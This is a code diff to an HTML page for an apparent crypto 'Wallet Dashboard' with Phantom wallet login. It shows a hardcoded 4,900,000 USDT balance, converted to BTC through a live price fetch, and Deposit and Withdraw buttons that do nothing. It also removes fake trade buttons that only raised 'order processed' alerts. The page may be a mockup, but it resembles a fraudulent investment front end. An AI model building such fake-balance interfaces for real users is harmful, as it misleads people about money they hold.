@@ -92,9 +92,10 @@
     }
 
     .balance {
-      font-size: 22px;
+      font-size: 18px;
       color: #39ff14;
       margin-top: 10px;
+      line-height: 1.8;
     }
 
     .wallet-info {
@@ -110,37 +111,10 @@
       margin-top: 20px;
     }
 
-    .trade-buttons {
-      display: flex;
-      justify-content: space-around;
-      margin-top: 15px;
-    }
-    .trade-buttons button {
-      width: 45%;
-      padding: 12px;
-      font-size: 16px;
-      border: none;
-      border-radius: 8px;
-      color: white;
-    }
-    .low-btn {
-      background-color: red;
-    }
-    .high-btn {
-      background-color: green;
-    }
-
-    .btc-label {
-      display: flex;
-      align-items: center;
-      gap: 10px;
-      font-size: 18px;
-      margin-top: 10px;
-    }
-
-    .btc-label img {
-      width: 24px;
-      height: 24px;
+    .crypto-icon {
+      width: 16px;
+      vertical-align: middle;
+      margin-right: 5px;
     }
   </style>
 </head>
@@ -167,20 +141,16 @@
 <div class="container hidden" id="dashboard">
   <h2>Wallet Dashboard</h2>
   <div class="wallet-info" id="walletAddress">Not connected</div>
-  <div class="balance">Balance: $1,000,000.00</div>
+  <div class="balance">
+    <img src="https://cryptologos.cc/logos/tether-usdt-logo.png" class="crypto-icon" />
+    Balance: 4,900,000.00 USDT<br>
+    <img src="https://cryptologos.cc/logos/bitcoin-btc-logo.png" class="crypto-icon" />
+    ≈ <span id="btcAmount">Loading...</span> BTC
+  </div>
   <button class="login-button" onclick="connectWallet()">Connect Wallet</button>
+  <button class="logout-btn" onclick="logout()">Logout</button>
 
-  <div class="btc-label">
-    <img src="https://cryptologos.cc/logos/bitcoin-btc-logo.png" alt="BTC">
-    <strong>BTC / USDT Chart</strong>
-  </div>
-
-  <div class="trade-buttons">
-    <button class="low-btn" onclick="alert('Your LOW order has been processed to your brokerage.')">LOW</button>
-    <button class="high-btn" onclick="alert('Your HIGH order has been processed to your brokerage.')">HIGH</button>
-  </div>
-
-  <iframe src="https://www.tradingview.com/widgetembed/?symbol=BINANCE:BTCUSDT&interval=15&theme=dark&style=1&withdateranges=1&hide_top_toolbar=1" frameborder="0"></iframe>
+  <iframe src="https://www.tradingview.com/widgetembed/?symbol=BINANCE:BTCUSDT&interval=15&theme=dark&style=1&toolbarbg=1e2328&withdateranges=1&hide_top_toolbar=1" frameborder="0"></iframe>
 </div>
 
 <div class="footer hidden" id="footerNav">
@@ -190,11 +160,11 @@
   <div class="footer-btn" onclick="openModal('withdrawModal')">
     <i class="fas fa-arrow-up"></i>Withdraw
   </div>
-  <div class="footer-btn" onclick="openModal('transactionsModal')">
+  <div class="footer-btn" onclick="alert('Transactions Coming Soon')">
     <i class="fas fa-list-alt"></i>Transactions
   </div>
-  <div class="footer-btn" onclick="logout()">
-    <i class="fas fa-cog"></i>Logout
+  <div class="footer-btn" onclick="alert('Settings Coming Soon')">
+    <i class="fas fa-cog"></i>Settings
   </div>
 </div>
 
@@ -203,7 +173,7 @@
   <div class="modal-content">
     <h3>Deposit</h3>
     <input type="number" class="login-input" placeholder="Amount" />
-    <button class="login-button" onclick="alert('Deposit request submitted.')">Confirm</button>
+    <button class="login-button">Confirm</button>
     <button class="logout-btn" onclick="closeModal('depositModal')">Close</button>
   </div>
 </div>
@@ -212,19 +182,9 @@
 <div class="modal" id="withdrawModal">
   <div class="modal-content">
     <h3>Withdraw</h3>
-    <input type="text" class="login-input" placeholder="Wallet Address" />
     <input type="number" class="login-input" placeholder="Amount" />
-    <button class="login-button" onclick="alert('Withdrawal request submitted.')">Confirm</button>
+    <button class="login-button">Confirm</button>
     <button class="logout-btn" onclick="closeModal('withdrawModal')">Close</button>
-  </div>
-</div>
-
-<!-- Transactions Modal -->
-<div class="modal" id="transactionsModal">
-  <div class="modal-content">
-    <h3>Transactions</h3>
-    <p>There are no transactions yet.</p>
-    <button class="logout-btn" onclick="closeModal('transactionsModal')">Close</button>
   </div>
 </div>
 
@@ -265,6 +225,7 @@
     document.getElementById('registerForm').classList.add('hidden');
     document.getElementById('dashboard').classList.remove('hidden');
     document.getElementById('footerNav').classList.remove('hidden');
+    fetchBTCPrice();
   }
 
   function logout() {
@@ -291,6 +252,19 @@
       }
     } else {
       alert("Phantom Wallet not installed.");
+    }
+  }
+
+  async function fetchBTCPrice() {
+    try {
+      const res = await fetch("https://api.coingecko.com/api/v3/simple/price?ids=bitcoin&vs_currencies=usd");
+      const data = await res.json();
+      const btcPrice = data.bitcoin.usd;
+      const usdtAmount = 4900000;
+      const btcAmount = (usdtAmount / btcPrice).toFixed(6);
+      document.getElementById("btcAmount").innerText = `${btcAmount}`;
+    } catch (e) {
+      document.getElementById("btcAmount").innerText = "Error loading";
     }
   }
 </script>
